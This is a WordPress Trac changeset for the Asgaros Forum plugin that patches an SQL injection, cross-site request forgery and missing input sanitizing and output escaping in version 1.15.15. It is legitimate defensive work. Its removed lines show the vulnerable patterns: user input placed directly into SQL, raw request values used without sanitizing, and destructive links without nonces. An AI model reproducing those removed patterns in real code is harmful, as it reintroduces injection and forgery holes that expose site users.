* ## [asgaros-forum/trunk/includes/forum-approval.php](/changeset/2642215/asgaros-forum/trunk/includes/forum-approval.php "Show the changeset 2642215 restricted to asgaros-forum/trunk/includes/forum-approval.php")

  | [r2476077](/browser/asgaros-forum/trunk/includes/forum-approval.php?rev=2476077#L75 "Show revision 2476077 of this file in browser") | [r2642215](/browser/asgaros-forum/trunk/includes/forum-approval.php?rev=2642215#L75 "Show revision 2642215 of this file in browser") |  |
  | --- | --- | --- |
  | 75 | 75 | } |
  | 76 | 76 | } else { |
  | 77 |  | return $this->asgarosforum->db->get\_results("SELECT \* FROM {$this->asgarosforum->tables->topics} WHERE approved = 0 AND parent\_id = {$forum\_id} ORDER BY id DESC;"); |
  |  | 77 | // Ensure forum-ID is an integer. |
  |  | 78 | $forum\_id = absint($forum\_id); |
  |  | 79 |  |
  |  | 80 | if ($forum\_id) { |
  |  | 81 | return $this->asgarosforum->db->get\_results("SELECT \* FROM {$this->asgarosforum->tables->topics} WHERE approved = 0 AND parent\_id = {$forum\_id} ORDER BY id DESC;"); |
  |  | 82 | } |
  | 78 | 83 | } |
  | 79 | 84 |  |
* ## [asgaros-forum/trunk/includes/forum-content.php](/changeset/2642215/asgaros-forum/trunk/includes/forum-content.php "Show the changeset 2642215 restricted to asgaros-forum/trunk/includes/forum-content.php")

  | [r2605005](/browser/asgaros-forum/trunk/includes/forum-content.php?rev=2605005#L87 "Show revision 2605005 of this file in browser") | [r2642215](/browser/asgaros-forum/trunk/includes/forum-content.php?rev=2642215#L87 "Show revision 2642215 of this file in browser") |  |
  | --- | --- | --- |
  | 87 | 87 | } |
  | 88 | 88 |  |
  |  | 89 | // Verify the corresponding nonce. |
  |  | 90 | $nonce = $\_REQUEST['\_wpnonce']; |
  |  | 91 |  |
  |  | 92 | if (!wp\_verify\_nonce($nonce, 'asgaros\_forum\_'.$this->get\_action())) { |
  |  | 93 | $this->asgarosforum->error = \_\_('You are not allowed to do this.', 'asgaros-forum'); |
  |  | 94 | return false; |
  |  | 95 | } |
  |  | 96 |  |
  | 89 | 97 | // Set the data. |
  | 90 | 98 | $this->set\_data(); |
  | […](/browser/asgaros-forum/trunk/includes/forum-content.php?rev=2605005#L161) | […](/browser/asgaros-forum/trunk/includes/forum-content.php?rev=2642215#L169) |  |
  | 161 | 169 |  |
  | 162 | 170 | if ($this->get\_action() === 'add\_topic') { |
  | 163 |  |  |
  | 164 | 171 | $add\_topic = array( |
  | 165 | 172 | 'forum'         => $this->asgarosforum->current\_forum, |
* ## [asgaros-forum/trunk/includes/forum-editor.php](/changeset/2642215/asgaros-forum/trunk/includes/forum-editor.php "Show the changeset 2642215 restricted to asgaros-forum/trunk/includes/forum-editor.php")

  | [r2131113](/browser/asgaros-forum/trunk/includes/forum-editor.php?rev=2131113#L260 "Show revision 2131113 of this file in browser") | [r2642215](/browser/asgaros-forum/trunk/includes/forum-editor.php?rev=2642215#L260 "Show revision 2642215 of this file in browser") |  |
  | --- | --- | --- |
  | 260 | 260 | if ($editor\_view === 'addtopic') { |
  | 261 | 261 | echo '<input type="hidden" name="submit\_action" value="add\_topic">'; |
  |  | 262 | wp\_nonce\_field('asgaros\_forum\_add\_topic'); |
  | 262 | 263 | } else if ($editor\_view === 'addpost') { |
  | 263 | 264 | echo '<input type="hidden" name="submit\_action" value="add\_post">'; |
  |  | 265 | wp\_nonce\_field('asgaros\_forum\_add\_post'); |
  | 264 | 266 | } else if ($editor\_view === 'editpost') { |
  | 265 | 267 | echo '<input type="hidden" name="submit\_action" value="edit\_post">'; |
  |  | 268 | wp\_nonce\_field('asgaros\_forum\_edit\_post'); |
  | 266 | 269 | } |
  | 267 | 270 |  |
* ## [asgaros-forum/trunk/includes/forum-memberslist.php](/changeset/2642215/asgaros-forum/trunk/includes/forum-memberslist.php "Show the changeset 2642215 restricted to asgaros-forum/trunk/includes/forum-memberslist.php")

  | [r2476077](/browser/asgaros-forum/trunk/includes/forum-memberslist.php?rev=2476077#L34 "Show revision 2476077 of this file in browser") | [r2642215](/browser/asgaros-forum/trunk/includes/forum-memberslist.php?rev=2642215#L34 "Show revision 2642215 of this file in browser") |  |
  | --- | --- | --- |
  | 34 | 34 | if ($this->functionality\_enabled()) { |
  | 35 | 35 | if (!empty($\_GET['filter\_type']) && !empty($\_GET['filter\_name'])) { |
  | 36 |  | if ($\_GET['filter\_type'] === 'role') { |
  | 37 |  | switch ($\_GET['filter\_name']) { |
  |  | 36 | $input\_filter\_type = sanitize\_key($\_GET['filter\_type']); |
  |  | 37 | $input\_filter\_name = sanitize\_key($\_GET['filter\_name']); |
  |  | 38 |  |
  |  | 39 | if ($input\_filter\_type === 'role') { |
  |  | 40 | switch ($input\_filter\_name) { |
  | 38 | 41 | case 'all': |
  | 39 | 42 | case 'normal': |
  | […](/browser/asgaros-forum/trunk/includes/forum-memberslist.php?rev=2476077#L45) | […](/browser/asgaros-forum/trunk/includes/forum-memberslist.php?rev=2642215#L48) |  |
  | 45 | 48 |  |
  | 46 | 49 | // Ensure that the filter is available. |
  | 47 |  | if ($this->is\_filter\_available($~~\_GET['filter\_name']~~)) { |
  | 48 |  | $this->filter\_name = $~~\_GET['filter\_name']~~; |
  |  | 50 | if ($this->is\_filter\_available($input\_filter\_name)) { |
  |  | 51 | $this->filter\_name = $input\_filter\_name; |
  | 49 | 52 | } |
  | 50 | 53 | break; |
  | 51 | 54 | } |
  | 52 |  | } else if ($~~\_GET['filter\_type']~~ === 'group') { |
  |  | 55 | } else if ($input\_filter\_type === 'group') { |
  | 53 | 56 | $this->filter\_type = 'group'; |
  | 54 |  | $this->filter\_name = $~~\_GET['filter\_name']~~; |
  |  | 57 | $this->filter\_name = $input\_filter\_name; |
  | 55 | 58 | } |
  | 56 | 59 | } |
* ## [asgaros-forum/trunk/includes/forum-online.php](/changeset/2642215/asgaros-forum/trunk/includes/forum-online.php "Show the changeset 2642215 restricted to asgaros-forum/trunk/includes/forum-online.php")

  | [r2181785](/browser/asgaros-forum/trunk/includes/forum-online.php?rev=2181785#L39 "Show revision 2181785 of this file in browser") | [r2642215](/browser/asgaros-forum/trunk/includes/forum-online.php?rev=2642215#L39 "Show revision 2642215 of this file in browser") |  |
  | --- | --- | --- |
  | 39 | 39 | // Clean guest-counter data for logged-in user. |
  | 40 | 40 | if (isset($\_COOKIE['asgarosforum\_unique\_id'])) { |
  | 41 |  | $unique\_id = ~~$\_COOKIE['asgarosforum\_unique\_id']~~; |
  |  | 41 | $unique\_id = sanitize\_key($\_COOKIE['asgarosforum\_unique\_id']); |
  | 42 | 42 |  |
  | 43 | 43 | // Delete cookie first. |
  | […](/browser/asgaros-forum/trunk/includes/forum-online.php?rev=2181785#L78) | […](/browser/asgaros-forum/trunk/includes/forum-online.php?rev=2642215#L78) |  |
  | 78 | 78 | setcookie('asgarosforum\_unique\_id', $unique\_id, 2147483647, COOKIEPATH, COOKIE\_DOMAIN); |
  | 79 | 79 | } else { |
  | 80 |  | $unique\_id = ~~$\_COOKIE['asgarosforum\_unique\_id']~~; |
  |  | 80 | $unique\_id = sanitize\_key($\_COOKIE['asgarosforum\_unique\_id']); |
  | 81 | 81 | } |
  | 82 | 82 |  |
  | […](/browser/asgaros-forum/trunk/includes/forum-online.php?rev=2181785#L172) | […](/browser/asgaros-forum/trunk/includes/forum-online.php?rev=2642215#L172) |  |
  | 172 | 172 |  |
  | 173 | 173 | $guests\_counter = count($currently\_online\_guests); |
  | 174 |  |  |
  | 175 |  | echo ~~sprintf(\_n('%s Guest', '%s Guests', $guests\_counter, 'asgaros-forum'), number\_format\_i18n($guests\_counter)~~); |
  |  | 174 | $guests\_counter\_output = sprintf(\_n('%s Guest', '%s Guests', $guests\_counter, 'asgaros-forum'), number\_format\_i18n($guests\_counter)); |
  |  | 175 | echo esc\_html($guests\_counter\_output); |
  | 176 | 176 | } |
  | 177 | 177 |  |
* ## [asgaros-forum/trunk/includes/forum-profile.php](/changeset/2642215/asgaros-forum/trunk/includes/forum-profile.php "Show the changeset 2642215 restricted to asgaros-forum/trunk/includes/forum-profile.php")

  | [r2511179](/browser/asgaros-forum/trunk/includes/forum-profile.php?rev=2511179#L94 "Show revision 2511179 of this file in browser") | [r2642215](/browser/asgaros-forum/trunk/includes/forum-profile.php?rev=2642215#L94 "Show revision 2642215 of this file in browser") |  |
  | --- | --- | --- |
  | 94 | 94 |  |
  | 95 | 95 | echo '<div class="user-info">'; |
  | 96 |  |  |
  | 97 | 96 | $user\_name = apply\_filters('asgarosforum\_filter\_username', $user\_data->display\_name, $user\_data); |
  | 98 | 97 | echo '<div class="profile-display-name">'.$user\_name.'</div>'; |
  | […](/browser/asgaros-forum/trunk/includes/forum-profile.php?rev=2511179#L121) | […](/browser/asgaros-forum/trunk/includes/forum-profile.php?rev=2642215#L120) |  |
  | 121 | 120 | // Profile link. |
  | 122 | 121 | if ($this->asgarosforum->current\_view === 'profile') { |
  | 123 |  | echo '<a class="active" href="'.~~$profile\_link~~.'">'.\_\_('Profile', 'asgaros-forum').'</a>'; |
  |  | 122 | echo '<a class="active" href="'.esc\_url($profile\_link).'">'.\_\_('Profile', 'asgaros-forum').'</a>'; |
  | 124 | 123 | } else { |
  | 125 |  | echo '<a href="'.~~$profile\_link~~.'">'.\_\_('Profile', 'asgaros-forum').'</a>'; |
  |  | 124 | echo '<a href="'.esc\_url($profile\_link).'">'.\_\_('Profile', 'asgaros-forum').'</a>'; |
  | 126 | 125 | } |
  | 127 | 126 |  |
  | […](/browser/asgaros-forum/trunk/includes/forum-profile.php?rev=2511179#L197) | […](/browser/asgaros-forum/trunk/includes/forum-profile.php?rev=2642215#L196) |  |
  | 197 | 196 | $text = $this->asgarosforum->cut\_string($text, 100); |
  | 198 | 197 |  |
  | 199 |  | echo '<a class="history-title" href="'.~~$link~~.'">'.$text.'</a>'; |
  |  | 198 | echo '<a class="history-title" href="'.esc\_url($link).'">'.$text.'</a>'; |
  | 200 | 199 |  |
  | 201 | 200 | $topic\_link = $this->asgarosforum->rewrite->get\_link('topic', $post->parent\_id); |
  | […](/browser/asgaros-forum/trunk/includes/forum-profile.php?rev=2511179#L203) | […](/browser/asgaros-forum/trunk/includes/forum-profile.php?rev=2642215#L202) |  |
  | 203 | 202 | $topic\_time = $this->asgarosforum->get\_activity\_timestamp($post->date); |
  | 204 | 203 |  |
  | 205 |  | echo '<span class="history-topic">'.\_\_('In:', 'asgaros-forum').' <a href="'.~~$topic\_link~~.'">'.$topic\_name.'</a></span>'; |
  |  | 204 | echo '<span class="history-topic">'.\_\_('In:', 'asgaros-forum').' <a href="'.esc\_url($topic\_link).'">'.$topic\_name.'</a></span>'; |
  | 206 | 205 | echo '</div>'; |
  | 207 | 206 |  |
* ## [asgaros-forum/trunk/includes/forum-rewrite.php](/changeset/2642215/asgaros-forum/trunk/includes/forum-rewrite.php "Show the changeset 2642215 restricted to asgaros-forum/trunk/includes/forum-rewrite.php")

  | [r2605005](/browser/asgaros-forum/trunk/includes/forum-rewrite.php?rev=2605005#L128 "Show revision 2605005 of this file in browser") | [r2642215](/browser/asgaros-forum/trunk/includes/forum-rewrite.php?rev=2642215#L128 "Show revision 2642215 of this file in browser") |  |
  | --- | --- | --- |
  | 128 | 128 | // Set the current view. |
  | 129 | 129 | if (!empty($\_GET['view'])) { |
  | 130 |  | $key = array\_search (esc\_html($\_GET['view']), $this->view\_mapping); |
  |  | 130 | $view = sanitize\_key($\_GET['view']); |
  |  | 131 | $key = array\_search($view, $this->view\_mapping); |
  | 131 | 132 |  |
  | 132 | 133 | if ($key == false) { |
  | 133 |  | $this->asgarosforum->current\_view = ~~esc\_html($\_GET['view'])~~; |
  |  | 134 | $this->asgarosforum->current\_view = $view; |
  | 134 | 135 | } else { |
  | 135 | 136 | $this->asgarosforum->current\_view = $key; |
* ## [asgaros-forum/trunk/includes/forum-search.php](/changeset/2642215/asgaros-forum/trunk/includes/forum-search.php "Show the changeset 2642215 restricted to asgaros-forum/trunk/includes/forum-search.php")

  | [r2332661](/browser/asgaros-forum/trunk/includes/forum-search.php?rev=2332661#L17 "Show revision 2332661 of this file in browser") | [r2642215](/browser/asgaros-forum/trunk/includes/forum-search.php?rev=2642215#L17 "Show revision 2642215 of this file in browser") |  |
  | --- | --- | --- |
  | 17 | 17 | public function initialize() { |
  | 18 | 18 | if (!empty($\_GET['keywords'])) { |
  | 19 |  | $keywords = ~~trim~~($\_GET['keywords']); |
  |  | 19 | $keywords = sanitize\_text\_field($\_GET['keywords']); |
  | 20 | 20 | $this->search\_keywords\_for\_query = esc\_sql($keywords); |
  | 21 | 21 | $this->search\_keywords\_for\_output = stripslashes(esc\_html($keywords)); |
  | […](/browser/asgaros-forum/trunk/includes/forum-search.php?rev=2332661#L43) | […](/browser/asgaros-forum/trunk/includes/forum-search.php?rev=2642215#L43) |  |
  | 43 | 43 | // Workaround for broken search in posts when using plain permalink structure. |
  | 44 | 44 | if (!empty($\_GET['p'])) { |
  | 45 |  | $value = ~~esc\_html(trim($\_GET['p'])~~); |
  |  | 45 | $value = sanitize\_key($\_GET['p']); |
  | 46 | 46 | echo '<input name="p" type="hidden" value="'.$value.'">'; |
  | 47 | 47 | } |
  | […](/browser/asgaros-forum/trunk/includes/forum-search.php?rev=2332661#L49) | […](/browser/asgaros-forum/trunk/includes/forum-search.php?rev=2642215#L49) |  |
  | 49 | 49 | // Workaround for broken search in pages when using plain permalink structure. |
  | 50 | 50 | if (!empty($\_GET['page\_id'])) { |
  | 51 |  | $value = ~~esc\_html(trim($\_GET['page\_id'])~~); |
  |  | 51 | $value = sanitize\_key($\_GET['page\_id']); |
  | 52 | 52 | echo '<input name="page\_id" type="hidden" value="'.$value.'">'; |
  | 53 | 53 | } |
* ## [asgaros-forum/trunk/includes/forum-usergroups.php](/changeset/2642215/asgaros-forum/trunk/includes/forum-usergroups.php "Show the changeset 2642215 restricted to asgaros-forum/trunk/includes/forum-usergroups.php")

  | [r2476077](/browser/asgaros-forum/trunk/includes/forum-usergroups.php?rev=2476077#L440 "Show revision 2476077 of this file in browser") | [r2642215](/browser/asgaros-forum/trunk/includes/forum-usergroups.php?rev=2642215#L440 "Show revision 2642215 of this file in browser") |  |
  | --- | --- | --- |
  | 440 | 440 |  |
  | 441 | 441 | public static function saveUserGroup() { |
  | 442 |  | $usergroup\_id           = ~~$\_POST['usergroup\_id']~~; |
  | 443 |  | $usergroup\_name         = ~~$\_POST['usergroup\_name']~~; |
  | 444 |  | $usergroup\_category     = ~~$\_POST['usergroup\_category']~~; |
  | 445 |  | $usergroup\_color        = ~~$\_POST['usergroup\_color']~~; |
  |  | 442 | $usergroup\_id           = sanitize\_key($\_POST['usergroup\_id']); |
  |  | 443 | $usergroup\_name         = sanitize\_text\_field($\_POST['usergroup\_name']); |
  |  | 444 | $usergroup\_category     = sanitize\_key($\_POST['usergroup\_category']); |
  |  | 445 | $usergroup\_color        = sanitize\_hex\_color($\_POST['usergroup\_color']); |
  | 446 | 446 | $usergroup\_visibility   = (isset($\_POST['usergroup\_visibility'])) ? 'hidden' : 'normal'; |
  | 447 | 447 | $usergroup\_auto\_add     = (isset($\_POST['usergroup\_auto\_add'])) ? 'yes' : 'no'; |
  | 448 |  | $usergroup\_icon         = ~~$\_POST['usergroup\_icon']~~; |
  |  | 448 | $usergroup\_icon         = sanitize\_key($\_POST['usergroup\_icon']); |
  | 449 | 449 |  |
  | 450 | 450 | if ($usergroup\_id === 'new') { |
* ## [asgaros-forum/trunk/includes/forum.php](/changeset/2642215/asgaros-forum/trunk/includes/forum.php "Show the changeset 2642215 restricted to asgaros-forum/trunk/includes/forum.php")

  | [r2635143](/browser/asgaros-forum/trunk/includes/forum.php?rev=2635143#L4 "Show revision 2635143 of this file in browser") | [r2642215](/browser/asgaros-forum/trunk/includes/forum.php?rev=2642215#L4 "Show revision 2642215 of this file in browser") |  |
  | --- | --- | --- |
  | 4 | 4 |  |
  | 5 | 5 | class AsgarosForum { |
  | 6 |  | var $version = '1.15.1~~4~~'; |
  |  | 6 | var $version = '1.15.15'; |
  | 7 | 7 | var $executePlugin = false; |
  | 8 | 8 | var $db = null; |
  | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2635143#L503) | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2642215#L503) |  |
  | 503 | 503 | } else if (isset($\_GET['move\_topic'])) { |
  | 504 | 504 | $this->moveTopic(); |
  | 505 |  | } else if (isset($\_GET['delete\_topic'])) { |
  |  | 505 | } else if (isset($\_GET['delete\_topic']) && wp\_verify\_nonce($\_REQUEST['\_wpnonce'], 'asgaros\_forum\_delete\_topic')) { |
  | 506 | 506 | $this->delete\_topic($this->current\_topic); |
  | 507 |  | } else if (isset($\_GET['remove\_post'])) { |
  |  | 507 | } else if (isset($\_GET['remove\_post']) && wp\_verify\_nonce($\_REQUEST['\_wpnonce'], 'asgaros\_forum\_delete\_post')) { |
  | 508 | 508 | $post\_id = (!empty($\_GET['post'])) ? absint($\_GET['post']) : 0; |
  | 509 | 509 | $this->remove\_post($post\_id); |
  | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2635143#L542) | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2642215#L542) |  |
  | 542 | 542 | $this->reports->add\_report($post\_id, $reporter\_id); |
  | 543 | 543 | } else if (!empty($\_GET['report\_delete']) && is\_numeric($\_GET['report\_delete'])) { |
  | 544 |  | $this->reports->remove\_report(~~$\_GET['report\_delete']~~); |
  |  | 544 | $this->reports->remove\_report(sanitize\_key($\_GET['report\_delete'])); |
  | 545 | 545 | } |
  | 546 | 546 |  |
  | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2635143#L731) | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2642215#L731) |  |
  | 731 | 731 |  |
  | 732 | 732 | if ($notice\_icon) { |
  | 733 |  | echo '<span class="notice-icon '.~~$notice\_icon~~.'"></span>'; |
  | 734 |  | } |
  | 735 |  |  |
  | 736 |  | if ($notice\_link) { echo '<a href="'.~~$notice\_link~~.'">'; } |
  |  | 733 | echo '<span class="notice-icon '.esc\_attr($notice\_icon).'"></span>'; |
  |  | 734 | } |
  |  | 735 |  |
  |  | 736 | if ($notice\_link) { echo '<a href="'.esc\_url($notice\_link).'">'; } |
  | 737 | 737 |  |
  | 738 | 738 | echo $notice\_message; |
  | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2635143#L948) | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2642215#L948) |  |
  | 948 | 948 | $topic\_title = esc\_html(stripslashes($topic\_object->name)); |
  | 949 | 949 |  |
  | 950 |  | echo '<div class="content-element topic '.~~$topic\_type~~.'">'; |
  | 951 |  | echo '<div class="topic-status '.~~$unread\_status~~.'"><i class="far fa-comments"></i></div>'; |
  |  | 950 | echo '<div class="content-element topic '.esc\_attr($topic\_type).'">'; |
  |  | 951 | echo '<div class="topic-status '.esc\_attr($unread\_status).'"><i class="far fa-comments"></i></div>'; |
  | 952 | 952 | echo '<div class="topic-name">'; |
  | 953 | 953 | if ($this->is\_topic\_sticky($topic\_object->id)) { |
  | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2635143#L1069) | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2642215#L1069) |  |
  | 1069 | 1069 |  |
  | 1070 | 1070 | if ($this->permissions->can\_delete\_topic($current\_user\_id, $this->current\_topic)) { |
  | 1071 |  | $menu .= '<a class="button button-red" href="'.$this->get\_link('topic', $this->current\_topic, array('delete\_topic' => 1)).'" onclick="return confirm(\''.\_\_('Are you sure you want to remove this?', 'asgaros-forum').'\');">'; |
  |  | 1071 | $delete\_topic\_link = $this->get\_link('topic', $this->current\_topic, array('delete\_topic' => 1, '\_wpnonce' => wp\_create\_nonce('asgaros\_forum\_delete\_topic'))); |
  |  | 1072 | $menu .= '<a class="button button-red" href="'.$delete\_topic\_link.'" onclick="return confirm(\''.\_\_('Are you sure you want to remove this?', 'asgaros-forum').'\');">'; |
  | 1072 | 1073 | $menu .= '<span class="menu-icon fas fa-trash-alt"></span>'; |
  | 1073 | 1074 | $menu .= \_\_('Delete', 'asgaros-forum'); |
  | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2635143#L1719) | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2642215#L1720) |  |
  | 1719 | 1720 | if ($this->permissions->can\_delete\_topic($current\_user\_id, $this->current\_topic) && $show\_all\_buttons) { |
  | 1720 | 1721 | // Delete button. |
  | 1721 |  | $menu .= '<a class="button button-red" href="'.$this->get\_link('topic', $this->current\_topic, array('delete\_topic' => 1)).'" onclick="return confirm(\''.\_\_('Are you sure you want to remove this?', 'asgaros-forum').'\');">'; |
  |  | 1722 | $delete\_topic\_link = $this->get\_link('topic', $this->current\_topic, array('delete\_topic' => 1, '\_wpnonce' => wp\_create\_nonce('asgaros\_forum\_delete\_topic'))); |
  |  | 1723 |  |
  |  | 1724 | $menu .= '<a class="button button-red" href="'.$delete\_topic\_link.'" onclick="return confirm(\''.\_\_('Are you sure you want to remove this?', 'asgaros-forum').'\');">'; |
  | 1722 | 1725 | $menu .= '<span class="menu-icon fas fa-trash-alt"></span>'; |
  | 1723 | 1726 | $menu .= \_\_('Delete', 'asgaros-forum'); |
  | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2635143#L1742) | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2642215#L1745) |  |
  | 1742 | 1745 | if ($this->permissions->can\_delete\_post($current\_user\_id, $post\_id, $author\_id, $post\_date) && ($counter > 1 || $this->current\_page >= 1)) { |
  | 1743 | 1746 | // Delete button. |
  | 1744 |  | $menu .= '<a class="delete-forum-post" onclick="return confirm(\''.\_\_('Are you sure you want to remove this?', 'asgaros-forum').'\');" href="'.$this->get\_link('topic', $this->current\_topic, array('post' => $post\_id, 'remove\_post' => 1)).'">'; |
  |  | 1747 | $delete\_post\_link = $this->get\_link('topic', $this->current\_topic, array('post' => $post\_id, 'remove\_post' => 1, '\_wpnonce' => wp\_create\_nonce('asgaros\_forum\_delete\_post'))); |
  |  | 1748 |  |
  |  | 1749 | $menu .= '<a class="delete-forum-post" onclick="return confirm(\''.\_\_('Are you sure you want to remove this?', 'asgaros-forum').'\');" href="'.$delete\_post\_link.'">'; |
  | 1745 | 1750 | $menu .= '<span class="menu-icon fas fa-trash-alt"></span>'; |
  | 1746 | 1751 | $menu .= \_\_('Delete', 'asgaros-forum'); |
  | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2635143#L1967) | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2642215#L1972) |  |
  | 1967 | 1972 |  |
  | 1968 | 1973 | function moveTopic() { |
  | 1969 |  | $newForumID = ~~$\_POST['newForumID']~~; |
  |  | 1974 | $newForumID = sanitize\_key($\_POST['newForumID']); |
  | 1970 | 1975 |  |
  | 1971 | 1976 | if ($this->permissions->isModerator('current') && $newForumID && $this->content->forum\_exists($newForumID)) { |
  | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2635143#L2268) | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2642215#L2273) |  |
  | 2268 | 2273 |  |
  | 2269 | 2274 | public function deleted\_user\_reassign($id, $reassign) { |
  | 2270 |  |  |
  | 2271 | 2275 | // Ensure that correct values are passed. |
  | 2272 | 2276 | if (empty($\_POST['forum\_reassign'])) { |
  | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2635143#L2283) | […](/browser/asgaros-forum/trunk/includes/forum.php?rev=2642215#L2287) |  |
  | 2283 | 2287 |  |
  | 2284 | 2288 | // Reassign forum posts and topics. |
  | 2285 |  | $this->db->update($this->tables->posts, array('author\_id' => $\_POST['forum\_reassign\_user']), array('author\_id' => $id), array('%d'), array('%d')); |
  | 2286 |  | $this->db->update($this->tables->topics, array('author\_id' => $\_POST['forum\_reassign\_user']), array('author\_id' => $id), array('%d'), array('%d')); |
  |  | 2289 | $author\_id = sanitize\_key($\_POST['forum\_reassign\_user']); |
  |  | 2290 | $this->db->update($this->tables->posts, array('author\_id' => $author\_id), array('author\_id' => $id), array('%d'), array('%d')); |
  |  | 2291 | $this->db->update($this->tables->topics, array('author\_id' => $author\_id), array('author\_id' => $id), array('%d'), array('%d')); |
  | 2287 | 2292 | } |
  | 2288 | 2293 |  |
* ## [asgaros-forum/trunk/readme.txt](/changeset/2642215/asgaros-forum/trunk/readme.txt "Show the changeset 2642215 restricted to asgaros-forum/trunk/readme.txt")

  | [r2635143](/browser/asgaros-forum/trunk/readme.txt?rev=2635143#L6 "Show revision 2635143 of this file in browser") | [r2642215](/browser/asgaros-forum/trunk/readme.txt?rev=2642215#L6 "Show revision 2642215 of this file in browser") |  |
  | --- | --- | --- |
  | 6 | 6 | Tested up to: 5.8 |
  | 7 | 7 | Requires PHP: 5.2 |
  | 8 |  | Stable tag: 1.15.1~~4~~ |
  |  | 8 | Stable tag: 1.15.15 |
  | 9 | 9 | License: GPLv2 or later |
  | 10 | 10 | License URI: http://www.gnu.org/licenses/gpl-2.0.html |
  | […](/browser/asgaros-forum/trunk/readme.txt?rev=2635143#L80) | […](/browser/asgaros-forum/trunk/readme.txt?rev=2642215#L80) |  |
  | 80 | 80 |  |
  | 81 | 81 | == Screenshots == |
  | 82 |  | 1. The forum overview~~.~~ |
  | 83 |  | 2. The t~~hread overview.~~ |
  | 84 |  | 3. The t~~hread view.~~ |
  | 85 |  | 4. Creating a new t~~hread.~~ |
  | 86 |  | 5. Manage forums in the administration area~~.~~ |
  | 87 |  | 6. Manage general options~~.~~ |
  |  | 82 | 1. The forum overview |
  |  | 83 | 2. The topic overview |
  |  | 84 | 3. The topic view |
  |  | 85 | 4. Creating a new topic |
  |  | 86 | 5. Manage forums in the administration area |
  |  | 87 | 6. Manage general options |
  | 88 | 88 |  |
  | 89 | 89 | == Changelog == |
  |  | 90 | = 1.15.15 = |
  |  | 91 | \* Fixed: SQL injection vulnerability in the approval-functionality |
  |  | 92 | \* Fixed: Prevent cross-site request forgery when creating, editing or deleting posts and topics |
  |  | 93 | \* Fixed: Add missing sanitizing for input data |
  |  | 94 | \* Fixed: Use sanitizing instead of escaping functions for input data |
  |  | 95 | \* Fixed: Add missing escaping for output data |
  | 90 | 96 | = 1.15.14 = |
  | 91 | 97 | \* Fixed: Escape forum-name properly in backend |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=2642215)
* [Zip Archive](?format=zip&new=2642215)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


